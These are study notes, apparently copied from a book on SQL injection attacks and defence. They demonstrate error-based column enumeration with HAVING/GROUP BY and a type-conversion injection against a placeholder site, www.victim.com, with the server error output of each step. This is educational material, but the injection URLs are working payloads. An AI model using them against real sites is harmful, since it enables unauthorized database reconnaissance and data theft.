@@ -1,0 +1,43 @@
+###NOTES FROM BOOK: SQL INJECTION ATTACKS AND DEFENCE####
+##Detecting SQLI
+
+There are four main types of operations at the database layer, as follows:
+• SELECT: read data from the database based on searching criteria
+• INSERT: insert new data into the database
+• UPDATE: update existing data based on given criteria
+• DELETE: delete existing data based on given criteria
+
+We need to know which of these is being performed..
+
+###COLUMN ENUMERATION USING GROUP BY AND HAVING####
+There are also techniques to display information about the SQL query executed by the database, such as the use of having 1=1:
+http://www.victim.com/showproducts.aspx?category=bikes’having1’=’1
+
+Application response:
+Server Error in ‘/’ Application.
+Column ‘products.productid’ is invalid in the select list because it is not contained in an aggregate function and there is no GROUP BY clause.
+Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.
+
+The HAVING clause is used in combination with the GROUP BY clause. It can also be used in a SELECT statement to filter the records that a GROUP BY returns. GROUP BY needs the SELECTed fields to be a result of an aggregated function or to be included in the GROUP BY clause. If the requirement is not met, the database sends back an error displaying the first column where this issue appeared.
+
+Using this technique and GROUP BY you can enumerate all the columns in a SELECT statement:
+http://www.victim.com/showproducts.aspx?category=bikes’GROUP BY productid having ‘1‘=’1
+Application response:
+Server Error in ‘/’ Application.
+Column ‘products.name’ is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
+Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.
+
+In the preceding example, we included the previously discovered column productid in the GROUP BY clause. The database error disclosed the next column, name. Just keep appending columns to enumerate them all:
+http://www.victim.com/showproducts.aspx?category=bikes’GROUP BY productid, name having ‘1’=’1
+Application response:
+Server Error in ‘/’ Application.
+Column ‘products.price’ is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
+Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code. Once you have enumerated the column names you can retrieve the values using the converting error technique that you saw earlier:
+http://www.victim.com/showproducts.aspx?category=bikes’and 1=0/name;--
+Application response:
+Server Error in ‘/’ Application.
+Syntax error converting the nvarchar value ‘Claud Butler Olympus D2’ to a column of data type int.
+Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code.
+
+
+
